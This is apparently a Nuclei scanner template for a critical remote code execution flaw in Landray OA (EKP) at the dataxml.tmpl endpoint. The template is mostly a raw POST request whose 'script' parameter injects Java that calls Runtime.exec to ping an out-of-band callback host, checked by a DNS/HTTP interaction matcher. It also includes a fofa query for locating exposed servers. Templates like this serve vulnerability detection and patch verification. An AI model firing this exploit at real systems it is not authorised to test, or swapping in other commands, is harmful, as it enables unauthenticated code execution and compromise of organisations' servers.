id: landray-oa-dataxml-tmpl-rce
info:
  name: 蓝凌 OA dataxml.tmpl - rce
  author: leadlife
  severity: critical
  description: 
  reference: 
    - https://github.com/wy876/POC/blob/8c65f6317950b5e6862ad49c777b5d743fd18aae/%E8%93%9D%E5%87%8CEKP%E7%B3%BB%E7%BB%9Fdataxml.tmpl%E5%AD%98%E5%9C%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="Landray-OA系统"
  tags: landray,rce,oa,oob


http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0)  Gecko/20100101 Firefox/92.0
        Accept:  text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
        Accept-Language:  zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Upgrade-Insecure-Requests: 1
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 192

        s_bean=ruleFormulaValidate&script=try {
        String cmd = "ping {{interactsh-url}}";
        Process child = Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
        System.err.println(e);
        }
    
    payloads:
      path:
        - '/ekp/data/sys-common/dataxml.tmpl'
        - '/data/sys-common/dataxml.tmpl'
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or